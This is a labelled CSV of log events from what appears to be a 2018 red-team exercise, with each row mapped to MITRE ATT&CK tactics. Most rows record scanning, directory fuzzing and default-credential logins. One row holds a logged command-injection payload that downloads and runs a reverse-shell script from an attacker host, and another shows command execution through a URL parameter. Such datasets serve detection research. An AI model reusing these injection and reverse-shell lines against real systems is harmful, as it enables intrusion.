ID,Host,Host_Type,Event,Tactic,Technique
2018_T02_027,t2-vdi-kali04,Attacker,"{""endtime"":""2018-11-03T18:01:09.044461Z"",""timestamp"":""2018-11-03T18:01:09.044461Z"",""count"":1,""dest_ip"":""154.0.166.162"",""site"":""haxf4rall.com"",""status"":200,""uri_path"":""/2017/10/02/traccar-open-source-gps-tracking-system/"",""sum(bytes_in)"":638,""sum(bytes_out)"":27943,""sum(time_taken)"":674559}",Pre-Attack,Pre-Attack
2018_T02_028,t2-vdi-kali06,Attacker,root 10316 1 2.2 00:00:00 0.6 49612 65940 pts/2 S 00:25 nmap -sV_-sC_-p_5000-5150_10.0.1.46,Discovery,Network Service Scanning
2018_T02_029,t2-prod-trackdash-00,Victim,"{""endtime"":""2018-11-03T21:15:26.819740Z"",""timestamp"":""2018-11-03T21:15:26.819733Z"",""bytes"":112,""src_ip"":""10.0.254.206"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":57721,""connection"":""10.0.1.46:5000"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:01:2E"",""dest_port"":5000,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":7,""flow_id"":""a1390ec7-d298-4d91-bea2-1b44fa076ea9"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T02_030,t2-vdi-kali06,Attacker,root 18822 1 9.3 00:00:00 0.6 49756 65928 pts/2 S 00:06 nmap -sV_-sC_-p_8082_10.0.1.46,Discovery,Network Service Scanning
2018_T02_031,t2-vdi-kali04,Attacker,/usr/bin/wfuzz_-w_wfuzz/wordlist/general/common.txt_--hc=404_http://10.0.1.46:8082/FUZZ,Discovery,Network Service Scanning
2018_T02_032,t2-vdi-kali04,Attacker,/usr/bin/wfuzz_-w_wordlist/general/common.txt_--hc=404_http://10.0.1.46:8082/FUZZ,Discovery,Network Service Scanning
2018_T02_033,t2-vdi-kali04,Attacker,"{""endtime"":""2018-11-03T17:47:32.755583Z"",""timestamp"":""2018-11-03T17:47:32.745537Z"",""bytes"":2275,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":60846,""bytes_in"":1525,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":750,""time_taken"":10097,""transport"":""tcp"",""flow_id"":""bfcdf15f-2b05-495a-93bc-4cb389ba46b8"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node072egvjeirjns12acecoy00y0m0.node0; ext-devices-grid=o%3Acolumns%3Da%253Ao%25253Aid%25253Ds%2525253Ah1%255Eo%25253Aid%25253Ds%2525253Ah2%255Eo%25253Aid%25253Ds%2525253Ah3%255Eo%25253Aid%25253Ds%2525253Ah4%255Eo%25253Aid%25253Ds%2525253Ah5%255Eo%25253Aid%25253Ds%2525253Ah6%255Eo%25253Aid%25253Ds%2525253Ah7%255Eo%25253Aid%25253Ds%2525253Ah8%255Eo%25253Aid%25253Ds%2525253Ah9%255Eo%25253Aid%25253Ds%2525253Ah10%5Eweight%3Dn%253A0; ext-state-grid=o%3Acolumns%3Da%253Ao%25253Aid%25253Ds%2525253Ah1%255Eo%25253Aid%25253Ds%2525253Ah2%5EstoreState%3Do%253Asorters%253Da%25253Ao%2525253Aroot%2525253Ds%252525253Adata%2525255Eproperty%2525253Ds%252525253Apriority%2525255Edirection%2525253Ds%252525253AASC%2525255Eid%2525253Ds%252525253Apriority%5Eweight%3Dn%253A10; ext-devices-and-state-panel=o%3Aweight%3Dn%253A-10; ext-show-geofences-button=o%3Apressed%3Db%253A0; ext-show-live-routes-button=o%3Apressed%3Db%253A0; ext-device-follow-button=o%3Apressed%3Db%253A1"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_034,t2-vdi-kali05,Attacker,"{""endtime"":""2018-11-03T17:48:51.945270Z"",""timestamp"":""2018-11-03T17:48:51.935433Z"",""bytes"":2549,""src_mac"":""42:01:0A:00:FE:CD"",""src_port"":33748,""bytes_in"":1799,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":750,""time_taken"":9863,""transport"":""tcp"",""flow_id"":""261df552-3846-4590-bb02-37ce9526426f"",""src_ip"":""10.0.254.205"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node01d3nd1z4ryboy1528m0nk8xrf61.node0; ext-devices-grid=o%3Acolumns%3Da%253Ao%25253Aid%25253Ds%2525253Ah1%255Eo%25253Aid%25253Ds%2525253Ah2%255Eo%25253Aid%25253Ds%2525253Ah3%255Eo%25253Aid%25253Ds%2525253Ah4%255Eo%25253Aid%25253Ds%2525253Ah5%255Eo%25253Aid%25253Ds%2525253Ah6%255Eo%25253Aid%25253Ds%2525253Ah7%255Eo%25253Aid%25253Ds%2525253Ah8%255Eo%25253Aid%25253Ds%2525253Ah9%255Eo%25253Aid%25253Ds%2525253Ah10%5Eweight%3Dn%253A0; ext-state-grid=o%3Acolumns%3Da%253Ao%25253Aid%25253Ds%2525253Ah1%255Eo%25253Aid%25253Ds%2525253Ah2%5EstoreState%3Do%253Asorters%253Da%25253Ao%2525253Aroot%2525253Ds%252525253Adata%2525255Eproperty%2525253Ds%252525253Apriority%2525255Edirection%2525253Ds%252525253AASC%2525255Eid%2525253Ds%252525253Apriority%5Eweight%3Dn%253A10; ext-devices-and-state-panel=o%3Aweight%3Dn%253A-10; ext-show-geofences-button=o%3Apressed%3Db%253A0; ext-show-live-routes-button=o%3Apressed%3Db%253A1; ext-device-follow-button=o%3Apressed%3Db%253A0; ext-events-scroll-to-last-button=o%3Apressed%3Db%253A1; ext-sound-button=o%3Apressed%3Db%253A0; ext-events-grid=o%3Acollapsed%3Do%253A%5Ecolumns%3Da%253Ao%25253Aid%25253Ds%2525253Ah1%255Eo%25253Aid%25253Ds%2525253Ah2%255Eo%25253Aid%25253Ds%2525253Ah3%5Eweight%3Dn%253A-20"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_035,t2-vdi-kali01,Attacker,"{""endtime"":""2018-11-03T18:03:03.635690Z"",""timestamp"":""2018-11-03T18:03:03.629356Z"",""bytes"":1338,""src_mac"":""42:01:0A:00:FE:C9"",""src_port"":56610,""bytes_in"":607,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":731,""time_taken"":6379,""transport"":""tcp"",""flow_id"":""712c0d58-c302-4f72-a25a-20c95c536f7d"",""src_ip"":""10.0.254.201"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node012kph4da2m9s8k0zt6locgnr62.node0"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_036,t2-vdi-kali01,Attacker,wget https://raw.githubusercontent.com/traccar/traccar/master/tools/test-commands.py,Pre-Attack,Pre-Attack
2018_T02_037,t2-vdi-kali01,Attacker,wget https://raw.githubusercontent.com/traccar/traccar/master/tools/test-trips.py,Pre-Attack,Pre-Attack
2018_T02_038,t2-vdi-kali02,Attacker,"{""endtime"":""2018-11-03T20:17:25.926376Z"",""timestamp"":""2018-11-03T20:17:25.919703Z"",""bytes"":1352,""src_mac"":""42:01:0A:00:FE:CA"",""src_port"":52352,""bytes_in"":602,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":750,""time_taken"":6695,""transport"":""tcp"",""flow_id"":""456a3dfd-6c88-483f-9541-7aeca9c1c091"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node0icw5mntau2rf1efx9szmpb4ai3.node0"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_039,t2-prod-trackdash-00,Victim,"{""endtime"":""2018-11-03T20:17:25.926949Z"",""timestamp"":""2018-11-03T20:17:25.920409Z"",""bytes"":1352,""src_mac"":""42:01:0A:00:01:01"",""src_port"":52352,""bytes_in"":602,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:01:2E"",""dest_port"":8082,""bytes_out"":750,""time_taken"":6645,""transport"":""tcp"",""flow_id"":""ca2ccf5b-628e-4d9f-a0eb-ec4ae8763c7a"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node0icw5mntau2rf1efx9szmpb4ai3.node0"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_040,t2-vdi-kali03,Attacker,root 9703 1 15.5 00:00:01 1.1 88168 199376 pts/2 S 00:12 nmap -sV_-sS_-sC_10.0.0.0/24_-p-,Discovery,Network Service Scanning
2018_T02_041,t2-vdi-kali04,Attacker,"{""endtime"":""2018-11-03T14:00:24.866245Z"",""timestamp"":""2018-11-03T14:00:24.842154Z"",""bytes"":2439,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":38000,""bytes_in"":375,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":2064,""time_taken"":24139,""transport"":""tcp"",""flow_id"":""88a87a4e-3dcd-4ff8-89d4-3b166cc392f5"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":1853,""http_content_type"":""text/html;charset=UTF-8"",""form_data"":""redirect_url=%2Fomk%2Fopen-audit"",""site"":""10.0.0.23"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.23/"",""server"":""Mojolicious (Perl)"",""status"":200,""uri_query"":""redirect_url=%2Fomk%2Fopen-audit"",""uri_path"":""/en/omk/open-audit/login"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T02_042,t2-vdi-kali04,Attacker,"{""endtime"":""2018-11-03T14:00:31.927072Z"",""timestamp"":""2018-11-03T14:00:31.901170Z"",""bytes"":2681,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":38018,""bytes_in"":558,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":2123,""time_taken"":25925,""transport"":""tcp"",""flow_id"":""dadfb01e-710a-4b67-a73e-b36a40680823"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":1739,""http_content_type"":""text/html;charset=UTF-8"",""cookie"":""PHPSESSID=0mhv2b249jnn6unub45vuedpq5; omk=eyJhdXRoX2RhdGEiOiJhZG1pbiIsImV4cGlyZXMiOjE1NDEyNTcyMzF9--8886d39f504b156254b44c67eb6023e0b54ec6e2"",""site"":""10.0.0.23"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.23/en/omk/open-audit/login?redirect_url=%2Fomk%2Fopen-audit"",""server"":""Mojolicious (Perl)"",""status"":200,""uri_path"":""/en/omk/open-audit/license_upgrade"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T02_043,t2-vdi-kali04,Attacker,"{""endtime"":""2018-11-03T14:34:05.244619Z"",""timestamp"":""2018-11-03T14:34:04.686146Z"",""bytes"":8698,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":38462,""bytes_in"":545,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":8153,""time_taken"":558505,""transport"":""tcp"",""flow_id"":""7f797dbc-704d-49fc-8d8a-068a3f523e00"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html;charset=UTF-8"",""cookie"":""PHPSESSID=0mhv2b249jnn6unub45vuedpq5; omk=eyJhdXRoX2RhdGEiOiJhZG1pbiIsImV4cGlyZXMiOjE1NDEyNTkyNDR9--57d5192f8f6941dbb48a5c6dfe98964168275e65"",""site"":""10.0.0.23"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.23/en/omk/open-audit/discoveries/create?single=y"",""server"":""Mojolicious (Perl)"",""status"":200,""uri_path"":""/en/omk/open-audit/discoveries/2"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_044,t2-corp-audit-00,Victim,www-data 30735 0 0.0 00:00:00 0.0 816 4628 ? S 00:11 sh -c_nohup_/usr/local/open-audit/other/discover_subnet.sh_subnet_range=10.0.0.10_url=http://test.com;_wget_http://10.0.254.204:8000/tcp_pty_backconnect.py;_python_tcp_pty_backconnect.pyindex.php/input/discoveries_submit_online=y_echo_output=n_create_file=n_debugging=0_discovery_id=2_>_/dev/null_2>&1_&,"Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_045,t2-corp-audit-00,Victim,"Connecting to 10.0.254.204:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 688 [text/plain] Saving to: 'tcp_pty_backconnect.py' 0K 100% 138M=0s 2018-11-03 14:31:45 (138 MB/s) - 'tcp_pty_backconnect.py' saved [688/688]",Lateral Movement,Remote File Copy
2018_T02_046,t2-vdi-kali03,Attacker,root 9703 1 15.5 00:00:01 1.1 88168 199376 pts/2 S 00:12 nmap -sV_-sS_-sC_10.0.0.0/24_-p-,Discovery,Network Service Scanning
2018_T02_047,t2-corp-onramp-00,Victim,"10.0.254.203 - - [03/Nov/2018:14:45:40 +0000] ""GET /nmaplowercheck1541256339 HTTP/1.1"" 200 4176 ""-"" ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)""",Discovery,Network Service Scanning
2018_T02_048,t2-vdi-kali03,Attacker,"{""endtime"":""2018-11-03T15:08:11.576607Z"",""timestamp"":""2018-11-03T15:08:11.569967Z"",""bytes"":2213,""src_mac"":""42:01:0A:00:FE:CB"",""src_port"":39590,""bytes_in"":326,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":1887,""time_taken"":6713,""transport"":""tcp"",""flow_id"":""03c6c968-6b8e-4ee7-b401-fbcdd5ccc8b1"",""src_ip"":""10.0.254.203"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.176/"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/about"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Discovery,Pre-Attack
2018_T02_049,t2-vdi-kali03,Attacker,"{""endtime"":""2018-11-03T15:08:23.686930Z"",""timestamp"":""2018-11-03T15:08:23.684710Z"",""bytes"":18686,""src_mac"":""42:01:0A:00:FE:CB"",""src_port"":39612,""bytes_in"":344,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":18342,""time_taken"":2242,""transport"":""tcp"",""flow_id"":""13bc9c70-ccd1-4e4f-9058-f33462ccbdba"",""src_ip"":""10.0.254.203"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":18013,""http_content_type"":""application/json; charset=UTF-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.176/about"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/public/apidoc.json"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T02_050,t2-vdi-kali05,Attacker,"{""endtime"":""2018-11-03T16:02:16.161990Z"",""timestamp"":""2018-11-03T16:02:16.157093Z"",""bytes"":2004,""src_mac"":""42:01:0A:00:FE:CD"",""src_port"":37642,""bytes_in"":298,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":1706,""time_taken"":4928,""transport"":""tcp"",""flow_id"":""012fd9be-12ee-45f4-acb9-901ae073ef47"",""src_ip"":""10.0.254.205"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/cmdlet"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_051,t2-vdi-kali04,Attacker,"{""endtime"":""2018-11-03T16:05:46.294424Z"",""timestamp"":""2018-11-03T16:05:46.287023Z"",""bytes"":848,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":53202,""bytes_in"":434,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":414,""time_taken"":7439,""transport"":""tcp"",""flow_id"":""f42ecfc2-e50a-4502-879e-7a628526af06"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":175,""http_content_type"":""application/json; charset=utf-8"",""form_data"":""cmd=ls"",""site"":""10.0.0.176"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.176/users"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_query"":""cmd=ls"",""uri_path"":""/api/v1/cmdlet"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_052,t2-prod-onramp-00,Victim,"10.0.254.204 - - [03/Nov/2018:16:05:46 +0000] ""GET /api/v1/cmdlet?cmd=ls HTTP/1.1"" 200 175 ""http://10.0.0.176/users"" ""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0""","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_053,t2-vdi-kali01,Attacker,root 8246 1 28.7 00:00:03 1.2 94068 189784 pts/0 R 00:12 nmap -sS_-sV_-T5_-p-_10.0.1.0/24,Discovery,Network Service Scanning
2018_T02_054,t2-prod-postgres-00,Victim,"{""endtime"":""2018-11-03T14:32:38.263159Z"",""timestamp"":""2018-11-03T14:32:38.263133Z"",""bytes"":112,""src_ip"":""10.0.254.205"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":47105,""connection"":""10.0.1.51:5432"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.51"",""dest_mac"":""42:01:0A:00:01:33"",""dest_port"":5432,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":26,""flow_id"":""6a544b54-80d2-4fc5-8d99-1b8fbd3c6894"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T02_055,t2-vdi-kali01,Attacker,"Start-Date: 2018-11-03 21:47:53 Commandline: apt install pgcli Install: python3-terminaltables:amd64 (3.1.0-2, automatic), python3-setproctitle:amd64 (1.1.10-1+b2, automatic), python3-pgspecial:amd64 (1.9.0-1.1, automatic), python3-humanize:amd64 (0.5.1-2, automatic), python3-prompt-toolkit:amd64 (1.0.15-1, automatic), python3-tabulate:amd64 (0.8.2-1, automatic), python3-psycopg2:amd64 (2.7.5-2, automatic), python3-pygments:amd64 (2.2.0+dfsg-2, automatic), python3-wcwidth:amd64 (0.1.7+dfsg1-2, automatic), pgcli:amd64 (1.9.1-1), python3-sqlparse:amd64 (0.2.4-1, automatic)",Pre-Attack,Pre-Attack
2018_T02_056,t2-vdi-kali01,Attacker,root 6194 1 15.0 00:00:00 0.5 40248 166760 pts/7 S 00:03 python3 /usr/bin/pgcli_-h_10.0.1.51_-p_5432_-U_postgres,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_057,t2-vdi-kali01,Attacker,tcp 0 0 10.0.254.201:50480 10.0.1.51:5432 ESTAB,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_058,t2-prod-postgres-00,Victim,tcp 0 0 10.0.1.51:5432 10.0.254.201:50480 ESTAB,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_059,t2-vdi-kali02,Attacker,root 9703 1 15.5 00:00:01 1.1 88168 199376 pts/2 S 00:12 nmap -sV_-sS_-sC_10.0.0.0/24_-p-,Discovery,Network Service Scanning
2018_T02_060,t2-corp-secruity-00,Victim,"{""endtime"":""2018-11-03T14:02:48.561172Z"",""timestamp"":""2018-11-03T14:02:48.561131Z"",""bytes"":112,""src_ip"":""10.0.254.202"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":57487,""connection"":""10.0.0.24:1723"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.0.24"",""dest_mac"":""42:01:0A:00:00:18"",""dest_port"":1723,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":41,""flow_id"":""df9a584b-4582-4399-86ca-d0e2418f66a1"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T02_061,t2-vdi-kali01,Attacker,mongo 10.0.0.24,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_062,t2-vdi-kali01,Attacker,root 21294 1 0.2 00:00:00 0.4 36148 764528 pts/5 S 00:18 mongo 10.0.0.24,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_063,t2-corp-secruity-00,Victim,tcp 0 0 10.0.0.24:27017 10.0.254.201:58092 ESTAB,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_064,t2-corp-onramp-00,Victim,"node 13578 root cwd DIR 8,1 4096 2838531 /data/web/onramp ",Discovery,System Service Discovery
2018_T02_065,t2-vdi-kali05,Attacker,root 8246 1 28.7 00:00:03 1.2 94068 189784 pts/0 R 00:12 nmap -sS_-sV_-T5_-p-_10.0.1.0/24,"Discovery, Discovery","Network Service Scanning, Security Software Discovery"
2018_T02_066,t2-prod-dapi-00,Victim,"{""endtime"":""2018-11-03T14:32:13.619733Z"",""timestamp"":""2018-11-03T14:32:13.619677Z"",""bytes"":112,""src_ip"":""10.0.254.205"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":47105,""connection"":""10.0.1.40:443"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.40"",""dest_mac"":""42:01:0A:00:01:28"",""dest_port"":443,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":56,""flow_id"":""843aa5e9-0e32-4c93-b998-1cafb0a9f623"",""protocol_stack"":""""}","Discovery, Discovery","Network Service Scanning, Security Software Discovery"
